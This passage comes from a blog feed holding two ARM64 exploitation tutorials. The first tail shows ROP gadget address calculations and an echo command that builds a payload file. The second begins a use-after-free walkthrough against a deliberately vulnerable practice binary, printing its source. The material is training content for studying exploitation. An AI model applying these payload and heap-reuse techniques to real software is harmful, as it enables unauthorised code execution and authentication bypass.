&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;n&quot;&gt;slid&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;second&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;instruction&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chain&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 
&lt;span class=&quot;n&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x8ac000&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x100007cdc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1008b3cdc&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000001008b3cdc&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;slid&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chain2&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 
&lt;span class=&quot;n&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x8ac000&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x100007d2c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1008b3d2c&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000001008b3d2c&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Using this info, we can now create our Rop chain&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ne&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\xdc\x3c\x8b\x00\x01\x00\x00\x00\x46\x46\x46\x46\x46\x46\x46\x46\x2c\x3d\x8b\x00\x01\x00\x00\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bin&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/arm/26.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Press enter where the rop binary is running and Success, we can see that the second chain was executed and the application is still running, which means it opened a listening port on netcat.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/arm/24.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

</content>
 </entry>
 
 <entry>
   <title>ARM64 Reversing and Exploitation Part 2 - Use After Free</title>
   <link href="https://bitbrain.github.io/2020/09/06/arm64-reversing-and-exploitation-part-2-use-after-free.html"/>
   <updated>2020-09-06T09:30:00+00:00</updated>
   <id>https://bitbrain.github.io/2020/09/06/arm64-reversing-and-exploitation-part-2-use-after-free</id>
   <content type="html">&lt;p&gt;In this blog post, we will be exploiting a Use-after-free vulnerability in the &lt;em&gt;vuln&lt;/em&gt; binary. The binaries for this and the next article can be found &lt;a href=&quot;https://drive.google.com/file/d/1f3PDEz-Fh9I3rSDhpMGW5ZrCU9g0BjKL/view?usp=sharing&quot;&gt;here&lt;/a&gt;. This UaF challenge is based on the one used by &lt;a href=&quot;https://exploit.education/protostar/heap-two/&quot;&gt;Protostar&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://owasp.org/www-community/vulnerabilities/Using_freed_memory&quot;&gt;Use-after-free&lt;/a&gt; vulnerabilities occurs on the use of heap allocated memory after it has been freed. This can lead to several unexpected behaviours, from a crash to code execution.&lt;/p&gt;

&lt;p&gt;Anyways, let’s get started. Copy the vuln binary to your iOS or Corellium device.&lt;/p&gt;

&lt;p&gt;Run the binary &lt;strong&gt;vuln&lt;/strong&gt;. You get a message that says “Better luck next time”&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/arm/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s open the binary in Hopper to see what’s going on. Let’s have a look at the main function.&lt;/p&gt;

&lt;p&gt;Just like the previous example on Heap Overflow, our objective here is to jump the &lt;strong&gt;useafterfree&lt;/strong&gt; function. For that, we need to pass in the argument &lt;strong&gt;uaf&lt;/strong&gt;&lt;/p&gt;

&lt;!--more--&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/arm/6.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The function then jumps execution to the function &lt;strong&gt;useafterfree&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;./vuln uaf&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/arm/7.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The output shows the address of the &lt;strong&gt;user&lt;/strong&gt; and the &lt;strong&gt;customerChat&lt;/strong&gt; object. We see several commands here, however on reversing the function, we find there is another hidden command &lt;strong&gt;reset&lt;/strong&gt; that basically frees the &lt;strong&gt;user&lt;/strong&gt; object.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/arm/8.png&quot; alt=&quot;1&quot; /&gt;
&lt;img src=&quot;/images/posts/arm/8a.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This can be confirmed by looking at the code itself&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;useafterfree&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Use after free challenge. Try to log in without entering the password. Available commands are:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;a) username XYZ&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;b) login&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;c) customerChat XYZ.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x400&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;{user = %p, customerChat = %p }&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;customerChat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fgets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strncmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;username &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;user&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;currentUser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;currentUser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Setting username&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strncmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;reset&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Freeing user object&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strncmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;customerChat &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;customerChat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strdup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strncmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;currentUser&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Current user is %s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strncmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;login&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strncmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;BBB&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;You have successfully logged in with password %s!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Please enter your password&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;current password is %s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;We see that the user struct object has an attribute &lt;strong&gt;password&lt;/strong&gt; . This is being checked later on. If the password has three B’s, the user gets logged in.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strncmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;BBB&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;You have successfully logged in with password %s!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This is an example of a &lt;strong&gt;UaF&lt;/strong&gt; since the user object can be freed by using the &lt;strong&gt;reset&lt;/strong&gt; command and then calling &lt;strong&gt;if(user-&amp;gt;password)&lt;/strong&gt; will basically trigger the UaF.&lt;/p&gt;

&lt;p&gt;We can also calculate the size of the user object. The user object is a object of struct &lt;strong&gt;currentUser&lt;/strong&gt; as can be seen in the following line&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;n&quot;&gt;user&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;currentUser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;currentUser&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The size of the user object is 256 + 4 = 260 bytes.&lt;/p&gt;

&lt;p&gt;If we can free the user object using &lt;strong&gt;reset&lt;/strong&gt; and then overwrite it with the value &lt;strong&gt;BBBB&lt;/strong&gt; such that we are able to overwrite the &lt;strong&gt;password&lt;/strong&gt; property, we might be able to execute a &lt;strong&gt;Use-after-free&lt;/strong&gt; condition and successfully log in.&lt;/p&gt;

&lt;p&gt;Since our objective is to login, so let’s try that by first entering the username command,&lt;/p&gt;

&lt;p&gt;$&lt;strong&gt;username admin&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;$&lt;strong&gt;login&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/arm/9.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now let’s enter the &lt;strong&gt;reset&lt;/strong&gt; command, this will free the buffer. Now let’s enter the &lt;strong&gt;customerChat&lt;/strong&gt; command followed by the chat and send 260 B’s (so the size of cutomerChat object is the same as than of user object), we keep entering the size of the chat around the same size of the user so that it can take over the memory address of the freed user object.&lt;/p&gt;

